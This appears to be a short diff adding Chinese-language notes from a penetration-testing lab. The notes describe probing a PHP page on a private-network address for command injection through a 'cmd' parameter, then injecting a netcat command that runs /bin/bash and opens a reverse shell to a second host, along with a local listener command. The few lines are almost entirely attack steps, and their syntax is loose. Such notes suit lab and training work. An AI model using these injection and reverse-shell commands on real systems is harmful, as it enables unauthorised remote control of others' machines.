@@ -1,0 +1,9 @@
+例如 
+http://192.168.52.131/wordlist.php
+可以添加命令注入参数测试
+如
+http://192.168.52.131/wordlist.php/? cmd dpkg -l | grep nc 检测是否有命令注入
+可以的话
+http://192.168.52.131/wordlist.php/? cmd nc 192.168.52.130 -e /bin/bash 1234
+本机
+nc 1234
